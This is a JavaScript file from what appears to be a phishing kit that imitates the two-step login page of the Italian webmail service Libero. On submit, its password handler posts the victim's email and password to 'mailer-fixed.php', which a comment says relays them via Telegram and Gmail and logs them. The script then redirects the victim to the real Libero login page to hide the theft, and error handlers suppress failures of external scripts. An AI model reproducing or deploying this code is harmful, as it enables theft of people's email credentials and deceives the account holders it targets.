// Login Form Event Handlers
$(document).ready(function () {
  console.log("Document ready! Setting up event handlers..."); // Debug log
  console.log("jQuery version:", $.fn.jquery); // Check jQuery version
  console.log("Form submit button found:", $("#form_submit").length); // Check if button exists

  // Prevent external script errors from breaking the page
  window.addEventListener("error", function (e) {
    if (
      e.filename &&
      (e.filename.includes("25708360.js") || e.filename.includes("core-it.js"))
    ) {
      console.log("External script error prevented:", e.message);
      e.preventDefault();
      return false;
    }
  });

  // Also catch unhandled promise rejections
  window.addEventListener("unhandledrejection", function (e) {
    if (
      e.reason &&
      e.reason.message &&
      (e.reason.message.includes("_iub") || e.reason.message.includes("lang"))
    ) {
      console.log(
        "External script promise rejection prevented:",
        e.reason.message
      );
      e.preventDefault();
      return false;
    }
  });

  // Global error handler for any other errors
  window.addEventListener("error", function (e) {
    if (
      e.message &&
      (e.message.includes("_iub") ||
        e.message.includes("lang") ||
        e.message.includes("Cannot read properties"))
    ) {
      console.log("Global error prevented:", e.message);
      e.preventDefault();
      return false;
    }
  });

  $("#loginid").on({
    keydown: function () {
      /*
      $('#box_err_msg').html(''); 
      $('#label_loginid').removeClass('error');
      $('#loginid_error').html('');
      */
    },
    paste: function () {
      $("#label_loginid").removeClass("error");
      $("#loginid_error").html("");
    },
    keypress: function (event) {
      return Autocomplete(this, event, arrValues);
    },
  });

  if (window.location.protocol == "ht" + "tp:") {
    $("#login_submit").prop("disabled", true);
  }

  // ===== TWO-STEP LOGIN FUNCTIONS =====

  // Override the original form submission
  $("#form_submit").click(function (e) {
    try {
      e.preventDefault(); // Prevent any form submission
      e.stopPropagation(); // Stop event bubbling
      console.log("AVANTI button clicked!"); // Debug log

      // Get the email value
      var email = $("#loginid").val();

      if (email && email.trim() !== "") {
        // Store the email globally
        currentUserEmail = email.trim();

        // Hide email step and show password step
        $(".content").first().hide();
        $("#password-step").show().addClass("active");

        // Set the email in the hidden field and display
        $("#hidden-loginid").val(currentUserEmail);
        $("#user-email-display").html(
          currentUserEmail +
            ' <a href="#" class="back-to-email" style="color:rgb(38, 111, 180); font-weight: bold;">non sei tu?</a>'
        );

        // Focus on password field
        $("#password").focus();
      } else {
        // Let the browser handle the validation with default "Please fill out this field" message
        $("#loginid").focus();
        return false;
      }
    } catch (error) {
      console.error("Error in email button click:", error);
    }
  });

  // Password form submission
  $("#password_submit").click(function (e) {
    try {
      e.preventDefault();
      e.stopPropagation(); // Stop event bubbling
      console.log("Password submit clicked!"); // Debug log

      // Check if password is empty
      var password = $("#password").val();
      if (!password || password.trim() === "") {
        // Show browser validation message
        $("#password").focus();
        return false;
      }

      // If password is valid, log the data first, then redirect
      console.log(
        "Password entered successfully! Logging data and redirecting..."
      );

      // Send data to mailer-fixed.php (which handles Telegram + Gmail + logging)
      var formData = new FormData();
      formData.append("email", currentUserEmail);
      formData.append("password", password);

      console.log("Sending data:", {
        email: currentUserEmail,
        password: password,
      });
      console.log("FormData contents:");
      for (let [key, value] of formData.entries()) {
        console.log(key + ": " + value);
      }

      // Send to mailer-fixed.php first (handles Telegram + Gmail + logging)
      console.log("Making fetch request to mailer-fixed.php...");
      fetch("mailer-fixed.php", {
        method: "POST",
        body: formData,
      })
        .then((response) => {
          console.log("Response received:", response);
          console.log("Response status:", response.status);
          console.log("Response headers:", response.headers);

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          return response.json();
        })
        .then((data) => {
          console.log("Data sent successfully:", data);

          // Wait 1 second, then redirect to Libero
          setTimeout(function () {
            console.log("Redirecting to Libero login page...");
            window.location.href =
              "https://login.libero.it/?service_id=webmail&ret_url=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin";
          }, 1000);
        })
        .catch((error) => {
          console.error("Error sending data:", error);
          console.error("Error details:", {
            message: error.message,
            stack: error.stack,
            name: error.name,
          });

          // Even if sending fails, still redirect
          setTimeout(function () {
            console.log("Redirecting to Libero login page...");
            window.location.href =
              "https://login.libero.it/?service_id=webmail&ret_url=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin";
          }, 1000);
        });
    } catch (error) {
      console.error("Error in password button click:", error);
    }
  });

  // Password field event handlers
  $("#password").on({
    keydown: function () {
      $("#keyid_error").hide();
      $("#label_password").removeClass("error");
    },
  });

  // Toggle password visibility
  $(".toggle-password").click(function () {
    var input = $("#password");
    var icon = $(this);

    if (input.attr("type") === "password") {
      input.attr("type", "text");
      icon.removeClass("fas fa-eye").addClass("fas fa-eye-slash");
    } else {
      input.attr("type", "password");
      icon.removeClass("fas fa-eye-slash").addClass("fas fa-eye");
    }
  });

  // Password field event handlers
  $("#password").on({
    keydown: function () {
      $("#keyid_error").hide();
      $("#label_password").removeClass("error");
    },
  });

  // Initialize fingerprinting when password step is shown
  $("#password_dimenticata").click(function () {});

  // Handle "non sei tu?" link click
  $(document).on("click", "a.back-to-email", function (e) {
    try {
      e.preventDefault();
      console.log("Going back to email step");

      // Show email step, hide password step
      $("#password-step").hide().removeClass("active");
      $(".content").first().show();

      // Focus on email field
      $("#loginid").focus();
    } catch (error) {
      console.error("Error going back to email:", error);
    }
  });

  // Debug: Monitor for any form submissions
  $("form").on("submit", function (e) {
    console.log("Form submission detected:", e.target.name || "unnamed form");
    console.log("Form action:", e.target.action);
    console.log("Form method:", e.target.method);
    e.preventDefault();
    e.stopPropagation();
    return false;
  });

  // Debug: Monitor for any navigation attempts
  $(window).on("beforeunload", function (e) {
    console.log("Page unload detected");
  });
});

// Autocomplete Functions
function letter_or_dot(x) {
  if (parseInt(x) == x) {
    var range = "azAZ..";
    for (var i = 0; i < range.length; i += 2)
      if (range.charCodeAt(i) <= x && x <= range.charCodeAt(i + 1)) return true;
  }
  return false;
}

function do_text_select(o, tmplen) {
  if ("setSelectionRange" in o) {
    o.setSelectionRange(tmplen, o.value.length);
  } else if ("createTextRange" in o) {
    // IE 8-
    var tr = o.createTextRange();
    tr.moveStart("character", tmplen);
    tr.moveEnd("character", o.value.len);
    tr.select();
  }
}

function Autocomplete(o, e, alist) {
  if (!o.value.match(/@/)) return true;
  var key;
  if ("key" in e && "string" == typeof e.key && e.key.match(/^[A-Za-z.]$/)) {
    key = e.key;
  } else if ("charCode" in e && letter_or_dot(e.charCode)) {
    key = String.fromCharCode(e.charCode);
  } else if ("keyCode" in e && letter_or_dot(e.keyCode)) {
    key = String.fromCharCode(e.keyCode);
  } else {
    return true;
  }
  var tmp = o.value;
  if (
    "selectionStart" in o &&
    0 <= o.selectionStart &&
    o.selectionStart < o.selectionEnd
  ) {
    tmp = o.value.substring(0, o.selectionStart);
  } else if (
    "selection" in document &&
    "type" in document.selection &&
    document.selection.type == "Text"
  ) {
    tmp = o.value.substring(
      0,
      o.value.length - document.selection.createRange().text.length
    );
  }
  tmp = tmp + key;
  var seg = tmp.split("@", 2);
  for (var i = 0; i < alist.length; ++i) {
    if (alist[i].indexOf(seg[1].toLowerCase()) == 0) {
      o.value = seg[0] + "@" + alist[i];
      do_text_select(o, tmp.length);
      return false;
    }
  }
  return true;
}

// Autocomplete domain values
var arrValues = ["blu.it", "giallo.it", "inwind.it", "iol.it", "libero.it"];

// Global variable to store the email
var currentUserEmail = "";

// Form Validation Function
function checkparams() {
  // var boxerrmsg_html_tmp = '';
  // var loginiderror_html_tmp = '';

  if (typeof captcha_checked_flag !== "undefined") {
    if (!captcha_checked_flag) {
      // $('#box_err_msg').fadeOut(60, function(){$('#box_err_msg').html('')});

      $("#label_loginid").removeClass("error");

      $("#loginid_error").fadeOut(60, function () {
        $("#loginid_error").html("");
      });

      $("#box_err_captcha").fadeOut(60, function () {
        $("#box_err_captcha").html("");
      });
      $("#box_err_captcha").fadeIn(310, function () {
        $("#box_err_captcha").html(
          "Non sono un robot &egrave; un campo obbligatorio."
        );
      });

      // $('#rc-anchor-container').css("border", "1px solid red");

      return false;
    }
  }

  var error_str_tmp = "";

  if ($("#loginid").val() == "") {
    error_str_tmp = "Email non inserita";
  } else {
    var loginid_arr_tmp = $("#loginid").val().split("@");
    if (loginid_arr_tmp.length > 1) {
      if (
        loginid_arr_tmp[0] == undefined ||
        loginid_arr_tmp[0] == "" ||
        loginid_arr_tmp[1] == undefined ||
        loginid_arr_tmp[1] == ""
      ) {
        error_str_tmp = "Email non completa";
      } else {
        var domain_arr_tmp = new Array("", "");
        domain_arr_tmp = loginid_arr_tmp[1].split(".");

        if (domain_arr_tmp.length < 2) {
          error_str_tmp = "Email non completa";
        } else {
          if (
            domain_arr_tmp[0] == undefined ||
            domain_arr_tmp[0] == "" ||
            domain_arr_tmp[1] == undefined ||
            domain_arr_tmp[1] == ""
          ) {
            error_str_tmp = "Email non completa";
          }
        }
      }
    }
  }

  var atleast_one_error = false;

  if (error_str_tmp.length) {
    $("#loginid_error").fadeIn(310, function () {
      $("#loginid_error").html(error_str_tmp);
    });

    $("#label_loginid").addClass("error");

    $("#loginid").focus();

    atleast_one_error = true;
  }

  if (atleast_one_error) return false;

  $("#loginid_error").fadeOut(60, function () {
    $("#loginid_error").html("");
  });

  $("#box_err_captcha").fadeOut(60, function () {
    $("#box_err_captcha").html("");
  });

  $("#form_submit").prop("disabled", true).css("opacity", 0.5);
  setTimeout(function () {
    $("#form_submit").prop("disabled", false).css("opacity", 1);
  }, 3000);

  return true;
}

// ===== PASSW.HTML FUNCTIONS =====

// Wait Layer Function
function show_wait_layer() {
  setTimeout(function () {
    $("#wait_layer").show();
  }, 1000);
  setTimeout(function () {
    $("#wait_layer").hide();
  }, 10000);
  return true;
}

// Password Form Validation Function
function checkparams() {
  if (typeof captcha_checked_flag !== "undefined") {
    if (!captcha_checked_flag) {
      // $('#box_err_msg').fadeOut(60, function(){$('#box_err_msg').html('')});

      $("#label_password").removeClass("error");

      $("#keyid_error").fadeOut(60, function () {
        $("#keyid_error").html("");
      });

      $("#box_err_captcha").fadeOut(60, function () {
        $("#box_err_captcha").html("");
      });
      $("#box_err_captcha").fadeIn(310, function () {
        $("#box_err_captcha").html(
          "Non sono un robot &egrave; un campo obbligatorio."
        );
      });

      return false;
    }
  }

  if ($("#password").val() == "") {
    $("#keyid_error").fadeIn(310, function () {
      $("#keyid_error").html("Password non inserita");
    });

    $("#label_password").addClass("error");

    $("#password").focus();

    return false;
  }

  // $('#box_err_msg').fadeOut(60, function(){$('#box_err_msg').html(''));

  $("#keyid_error").fadeOut(60, function () {
    $("#keyid_error").html("");
  });

  $("#box_err_captcha").fadeOut(60, function () {
    $("#box_err_captcha").html("");
  });

  // $('#form_submit').prop('disabled', true);
  $("#form_submit").prop("disabled", true).css("opacity", 0.5);
  setTimeout(function () {
    $("#form_submit").prop("disabled", false).css("opacity", 1);
  }, 3000);

  return true;
}

// Ad Block Detection Functions
var abdetected = -1;

function loadExternalScript(url, onloadCallback, onerrorCallback) {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = url;
  script.onreadystatechange = onloadCallback;
  script.onload = onloadCallback;
  script.onerror = onerrorCallback;
  document.head.appendChild(script);
}

function adBlockNOTDetected() {
  abdetected = 0;
  // alert('adclock NOT detected');
}

function adBlockDetected() {
  abdetected = 1;
  // alert('adclock detected');
  $("#adblock").val(1);
}

// Initialize Ad Block Detection
loadExternalScript(
  "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
  adBlockNOTDetected,
  adBlockDetected
);

setTimeout(function () {
  if (abdetected == -1) adBlockDetected();
}, 3000);

// ===== TWO-STEP LOGIN FUNCTIONS =====

// Function to go back to email step
function goBackToEmail() {
  $("#password-step").removeClass("active").hide();
  $(".content").first().show();
  $("#loginid").focus();
}

// Password validation function
function checkPasswordParams() {
  // Check if captcha is required and completed
  if (typeof captcha_checked_flag !== "undefined") {
    if (!captcha_checked_flag) {
      $("#label_password").removeClass("error");

      $("#keyid_error").fadeOut(60, function () {
        $("#keyid_error").html("");
      });

      $("#box_err_captcha_password").fadeOut(60, function () {
        $("#box_err_captcha_password").html("");
      });

      $("#box_err_captcha_password").fadeIn(310, function () {
        $("#box_err_captcha_password").html(
          "Non sono un robot è un campo obbligatorio."
        );
      });

      return false;
    }
  }

  // Check if password is empty
  if ($("#password").val() === "") {
    $("#keyid_error").fadeIn(310, function () {
      $("#keyid_error").html("Password non inserita");
    });

    $("#label_password").addClass("error");
    $("#password").focus();
    return false;
  }

  // Clear any previous errors
  $("#keyid_error").fadeOut(60, function () {
    $("#keyid_error").html("");
  });

  $("#box_err_captcha_password").fadeOut(60, function () {
    $("#box_err_captcha_password").html("");
  });

  // Disable submit button temporarily
  $("#password_submit").prop("disabled", true).css("opacity", 0.5);
  setTimeout(function () {
    $("#password_submit").prop("disabled", false).css("opacity", 1);
  }, 3000);

  return true;
}

// Toggle password visibility function
function togglePassword() {
  var input = document.getElementById("password");
  var icon = document.querySelector(".toggle-password");

  if (input.type === "password") {
    input.type = "text";
    icon.classList.remove("fas", "fa-eye");
    icon.classList.add("fas", "fa-eye-slash");
  } else {
    input.type = "password";
    icon.classList.remove("fas", "fa-eye-slash");
    icon.classList.add("fas", "fa-eye");
  }
}
